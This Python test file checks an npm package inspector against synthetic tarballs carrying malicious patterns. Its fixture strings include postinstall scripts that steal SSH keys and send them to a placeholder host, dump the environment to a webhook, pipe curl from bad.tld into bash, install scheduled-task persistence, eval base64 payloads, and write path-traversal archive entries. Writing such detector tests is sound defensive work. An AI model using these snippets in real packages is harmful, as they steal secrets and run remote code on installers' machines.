#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Тесты разборщика npm-пакетов: собираем синтетические .tgz с разными «сюрпризами»
и проверяем, что каждый ловится, а чистый пакет не получает ложных обвинений.

Запуск: python dev/tests/test_inspector.py
"""

import io
import json
import os
import shutil
import sys
import tarfile
import tempfile
import unittest

ROOT = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
sys.path.insert(0, os.path.join(ROOT, "dev"))

import inspect_npm_package as insp  # noqa: E402


def make_tgz(files: dict, with_traversal: bool = False) -> str:
    """Собирает .tgz из словаря {путь: содержимое}."""
    fd, path = tempfile.mkstemp(suffix=".tgz", prefix="fixture-")
    os.close(fd)
    with tarfile.open(path, "w:gz") as tf:
        for name, content in files.items():
            data = content.encode("utf-8")
            info = tarfile.TarInfo(name=name)
            info.size = len(data)
            tf.addfile(info, io.BytesIO(data))
        if with_traversal:
            data = b"echo pwned\n"
            info = tarfile.TarInfo(name="../../evil.sh")
            info.size = len(data)
            tf.addfile(info, io.BytesIO(data))
    return path


def pkg_json(scripts=None, deps=None, name="test-package", bin_=None):
    obj = {"name": name, "version": "1.0.0", "license": "MIT",
           "description": "тестовый пакет", "scripts": scripts or {}}
    if deps:
        obj["dependencies"] = deps
    if bin_:
        obj["bin"] = bin_
    return json.dumps(obj, ensure_ascii=False, indent=2)


class InspectorTestBase(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="insp-test-")
        self.addCleanup(shutil.rmtree, self.tmp, True)

    def analyze(self, files, with_traversal=False):
        tgz = make_tgz(files, with_traversal)
        self.addCleanup(os.remove, tgz)
        return insp.inspect(tgz)

    def rules(self, rep):
        return {f.rule for f in rep.findings}

    def sev(self, rep):
        return {f.severity for f in rep.findings}


class TestCleanPackage(InspectorTestBase):
    def test_clean_cli_is_not_accused(self):
        rep = self.analyze({
            "package.json": pkg_json(bin_={"smart-cfg": "./cli.js"}),
            "cli.js": "#!/usr/bin/env node\n"
                      "const os = require('os');\n"
                      "console.log('Установите base_url вручную:');\n"
                      "console.log('  https://example.com/v1');\n",
        })
        self.assertNotIn("crit", self.sev(rep), f"ложное обвинение: {rep.findings}")
        self.assertNotIn("high", self.sev(rep), f"ложное обвинение: {rep.findings}")

    def test_config_writer_is_moderate_only(self):
        """Пакет лишь прописывает конфиг инструмента — это норма, но знать надо."""
        rep = self.analyze({
            "package.json": pkg_json(bin_={"smart-cfg": "./cli.js"}),
            "cli.js": "const fs = require('fs'), os = require('os'), path = require('path');\n"
                      "const p = path.join(os.homedir(), '.config', 'opencode', 'opencode.json');\n"
                      "fs.writeFileSync(p, JSON.stringify({baseURL: 'https://api.example.com/v1'}));\n"
                      "console.log('готово');\n",
        })
        self.assertIn("tool_cfg", self.rules(rep))
        self.assertNotIn("crit", self.sev(rep))
        self.assertEqual(rep.verdict, "ОСТОРОЖНО")


class TestMaliciousPostinstall(InspectorTestBase):
    def test_ssh_stealer_flagged_critical(self):
        rep = self.analyze({
            "package.json": pkg_json(scripts={"postinstall": "node setup.js"}),
            "setup.js": "const fs = require('fs'), os = require('os');\n"
                        "const key = fs.readFileSync(os.homedir() + '/.ssh/id_rsa', 'utf8');\n"
                        "fetch('https://collect.example.net/upload', {method: 'POST', body: key});\n",
        })
        self.assertEqual(rep.verdict, "ОПАСНО")
        self.assertIn("crit", self.sev(rep))
        self.assertTrue(any(f.rule == "secret" for f in rep.findings))
        self.assertTrue(any(f.rule.startswith("lifecycle") for f in rep.findings))

    def test_postinstall_downloading_curl_flagged(self):
        rep = self.analyze({
            "package.json": pkg_json(scripts={"postinstall": "curl -fsSL https://bad.tld/x.sh | bash"}),
            "index.js": "console.log('hi');\n",
        })
        self.assertEqual(rep.verdict, "ОПАСНО")
        self.assertTrue(any("curl" in f.text for f in rep.findings if f.severity == "crit"))

    def test_env_exfiltration_flagged(self):
        rep = self.analyze({
            "package.json": pkg_json(scripts={"install": "node i.js"}),
            "i.js": "const data = JSON.stringify(process.env);\n"
                    "fetch('https://discord.com/api/webhooks/123/abc', {method:'POST', body: data});\n",
        })
        self.assertEqual(rep.verdict, "ОПАСНО")
        self.assertTrue({"env_dump", "exfil_hook"} & self.rules(rep))

    def test_persistence_flagged(self):
        rep = self.analyze({
            "package.json": pkg_json(scripts={"postinstall": "node p.js"}),
            "p.js": "const {execSync} = require('child_process');\n"
                    "execSync('schtasks /create /tn update /tr node-update /sc minute /mo 5');\n",
        })
        self.assertEqual(rep.verdict, "ОПАСНО")
        self.assertTrue({"persist", "proc"} <= self.rules(rep))


class TestObfuscation(InspectorTestBase):
    def test_base64_plus_eval_flagged(self):
        blob = "Y29uc3QgZnMgPSByZXF1aXJlKCdmcycpOyBjb25zb2xlLmxvZygncHduZWQnKTs" * 6
        rep = self.analyze({
            "package.json": pkg_json(),
            "lib.js": f"const payload = atob('{blob}');\neval(payload);\n",
        })
        self.assertIn("crit", self.sev(rep), f"обфускация+eval не пойман: {rep.findings}")
        self.assertTrue(any(f.rule.startswith("combo:") for f in rep.findings))


class TestArchiveSafety(InspectorTestBase):
    def test_path_traversal_flagged(self):
        rep = self.analyze({"package.json": pkg_json(), "index.js": "console.log(1);\n"},
                           with_traversal=True)
        self.assertEqual(rep.verdict, "ОПАСНО")
        self.assertTrue(any(f.rule == "archive" for f in rep.findings))

    def test_traversal_file_not_extracted(self):
        tgz = make_tgz({"package.json": pkg_json()}, with_traversal=True)
        self.addCleanup(os.remove, tgz)
        dest = os.path.join(self.tmp, "out")
        os.makedirs(dest)
        _names, warns = insp.extract_safely(tgz, dest)
        self.assertTrue(warns, "небезопасная запись должна быть замечена")
        self.assertFalse(os.path.exists(os.path.join(self.tmp, "evil.sh")),
                         "файл наружу распаковываться не должен")


class TestNoRegistryProvenance(InspectorTestBase):
    def test_url_source_noted(self):
        """Пакет по прямой ссылке не имеет истории публикации в npm — это надо сказать явно."""
        r = insp.Report(source="https://smartapi.shop/smart-config-models.tgz")
        insp.verify_no_registry_provenance(r, "https://smartapi.shop/smart-config-models.tgz")
        joined = " ".join(r.notes).lower()
        self.assertIn("официального реестра", joined)
        self.assertIn("provenance", joined)

    def test_registry_source_not_flagged(self):
        """Пакет из официального реестра npm такой заметки не получает."""
        r = insp.Report(source="https://registry.npmjs.org/opencode-ai/-/opencode-ai-1.0.0.tgz")
        insp.verify_no_registry_provenance(r, r.source)
        self.assertEqual([], r.notes)

    def test_git_dependencies_noted_in_json(self):
        rep = self.analyze({
            "package.json": pkg_json(deps={"some-lib": "https://evil.tld/lib.tgz"}),
            "index.js": "require('some-lib');\n",
        })
        out = insp.to_json(rep)
        self.assertEqual(out["verdict"], rep.verdict)
        self.assertIn("sha256", out)


class TestVerdictsAndExitCodes(InspectorTestBase):
    def test_verdict_levels(self):
        clean = insp.Report(source="local.tgz")
        insp.verdict(clean)
        self.assertEqual(clean.verdict, "ЧИСТО")
        mid = insp.Report(source="local.tgz")
        mid.findings.append(insp.Finding("tool_cfg", "med", "a.js", 1, "", "x"))
        insp.verdict(mid)
        self.assertEqual(mid.verdict, "ОСТОРОЖНО")
        bad = insp.Report(source="local.tgz")
        bad.findings.append(insp.Finding("secret", "crit", "a.js", 1, "", "x"))
        insp.verdict(bad)
        self.assertEqual(bad.verdict, "ОПАСНО")

    def test_cli_exit_code_two_for_dangerous(self):
        tgz = make_tgz({
            "package.json": pkg_json(scripts={"postinstall": "node s.js"}),
            "s.js": "require('fs').readFileSync(require('os').homedir() + '/.ssh/id_rsa');\n"
                    "fetch('https://x.tld', {method:'POST'});\n",
        })
        self.addCleanup(os.remove, tgz)
        code = insp.main([tgz, "--report", os.path.join(self.tmp, "r.json")])
        self.assertEqual(code, 2)
        saved = json.load(open(os.path.join(self.tmp, "r.json"), encoding="utf-8"))
        self.assertEqual(saved["verdict"], "ОПАСНО")
        self.assertTrue(saved["findings"])

    def test_clean_package_exit_code_zero(self):
        tgz = make_tgz({"package.json": pkg_json(), "index.js": "console.log('ok');\n"})
        self.addCleanup(os.remove, tgz)
        self.assertEqual(insp.main([tgz]), 0)


if __name__ == "__main__":
    unittest.main(verbosity=2)
